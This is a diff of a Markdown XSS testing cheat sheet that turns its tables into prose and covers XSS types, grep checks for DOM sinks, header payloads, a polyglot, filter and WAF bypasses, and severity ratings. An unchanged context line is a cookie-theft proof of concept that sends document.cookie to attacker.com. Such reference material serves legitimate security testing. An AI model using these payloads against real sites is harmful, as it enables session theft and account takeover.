@@ -6,12 +6,13 @@
 
 ## Types
 
-| Type | Persistence | Detection |
-|------|------------|-----------|
-| Reflected | No | URL/param based |
-| Stored | Yes | Input → storage → output |
-| DOM-based | No | Client-side JS sinks |
-| Blind | Yes | Fires when admin views |
+**Reflected** — Not persisted. Delivered via URL/param. Requires victim to click a crafted link.
+
+**Stored** — Persisted in database. Fires for every user who views the affected content.
+
+**DOM-based** — Lives entirely in client-side JavaScript. Never touches the server.
+
+**Blind** — Stored XSS that fires in an admin panel or back-office tool you can't directly see.
 
 ---
 
@@ -30,7 +31,7 @@ grep -r "innerHTML\|outerHTML\|document\.write\|insertAdjacentHTML" js/
 grep -r "location\.hash\|location\.search\|location\.href" js/
 grep -r "eval(\|setTimeout(\|setInterval(" js/
 
-# XSS via headers
+# XSS via HTTP headers
 X-Forwarded-For: <script>alert(1)</script>
 User-Agent: <script>alert(1)</script>
 Referer: <script>alert(1)</script>
@@ -60,9 +61,6 @@ javascript:alert(1)
 
 // Cookie theft (PoC)
 <script>fetch('https://attacker.com/?c='+btoa(document.cookie))</script>
-
-// DOM clobber
-<img id=x><script>alert(x.src)</script>
 
 // Polyglot
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
@@ -98,23 +96,28 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 
 ## Bypass Techniques
 
-| Filter | Bypass |
-|--------|--------|
-| `script` blocked | `<img onerror=...>`, `<svg onload=...>` |
-| Quotes stripped | Backticks: `onerror=alert\`1\`` |
-| `alert` blocked | `confirm(1)`, `prompt(1)`, `console.log(1)` |
-| HTML encoded | Double encode: `&amp;lt;script&amp;gt;` |
-| CSP `script-src 'self'` | JSONP endpoint, Angular template injection |
-| WAF | Use Unicode, HTML entities, null bytes |
+**`script` tag blocked** → use `<img onerror=...>` or `<svg onload=...>`
+
+**Quotes stripped** → use backticks: `` onerror=alert`1` ``
+
+**`alert` blocked** → try `confirm(1)`, `prompt(1)`, `console.log(1)`
+
+**HTML encoded** → double encode: `&amp;lt;script&amp;gt;`
+
+**CSP `script-src 'self'`** → look for JSONP endpoint or Angular template injection
+
+**WAF present** → try Unicode normalization, HTML entities, null bytes
 
 ---
 
 ## Impact Assessment
 
-| Scenario | Severity |
-|----------|----------|
-| Stored XSS in admin panel | Critical |
-| Stored XSS — ATO possible | High |
-| Reflected XSS with cookie theft | High |
-| DOM XSS — requires user action | Medium |
-| Self-XSS only | Low |
+**Stored XSS in admin panel** → Critical
+
+**Stored XSS where ATO is possible** → High
+
+**Reflected XSS with cookie theft** → High
+
+**DOM XSS requiring user action** → Medium
+
+**Self-XSS only (no chain possible)** → Low
